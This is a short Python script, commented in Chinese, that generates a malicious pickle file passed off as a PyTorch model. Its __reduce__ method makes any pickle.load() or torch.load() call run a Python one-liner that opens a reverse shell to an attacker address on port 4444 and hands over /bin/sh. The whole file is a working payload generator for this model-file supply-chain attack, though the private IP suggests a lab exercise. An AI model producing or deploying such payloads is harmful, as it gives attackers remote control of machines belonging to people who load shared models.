import pickle
import os

# 攻击者的 IP 和监听端口，victim 的 shell 会连回这里
ATTACKER_IP = "172.21.0.10"
ATTACKER_PORT = 4444

# 利用 pickle 的 __reduce__ 机制植入恶意代码
# 当任何人调用 pickle.load() 或 torch.load() 加载这个文件时
# __reduce__ 返回的代码会自动执行
class ReverseShell:
    def __reduce__(self):
        # 这段代码会在 victim 机器上执行：
        # 建立 socket 连接到攻击者，然后把命令行控制权交给攻击者
        cmd = (
            f"python3 -c \""
            f"import socket,pty,os;"
            f"s=socket.socket();"
            f"s.connect(('{ATTACKER_IP}',{ATTACKER_PORT}));"
            f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
            f"pty.spawn('/bin/sh')\""
        )
        return (os.system, (cmd,))

# 把恶意对象序列化成 pkl 文件，伪装成正常的 PyTorch 模型
with open("/model/malicious_model.pkl", "wb") as f:
    pickle.dump(ReverseShell(), f)

print("Payload generated: malicious_model.pkl")